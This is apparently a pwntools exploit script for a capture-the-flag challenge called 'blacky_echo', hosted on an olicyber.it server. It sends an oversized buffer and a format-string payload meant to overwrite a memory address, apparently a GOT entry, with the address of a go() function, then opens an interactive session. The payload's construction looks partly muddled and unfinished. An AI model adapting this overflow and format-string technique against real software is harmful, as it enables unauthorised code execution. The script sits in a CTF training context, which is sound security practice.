from pwn import *   

if args.REMOTE:
    r = remote('blacky-echo.challs.olicyber.it', 11002)
else:
    r = gdb.debug('./blacky_echo', '''
        b *go
        continue
    ''')

r.recvuntil(b"Size: ")
r.sendline(b"65580") #Size: 

print(str(int(0x400B54)))

print(str(0x400B + 0x54)) #address of go(), to test need to insert this before %addr$n
r.recvuntil(b"Input: ")
r.sendline(b"a"*65546 + p64(0x400B54) + b"%" + p64(0x602088) + b"$n")
r.interactive()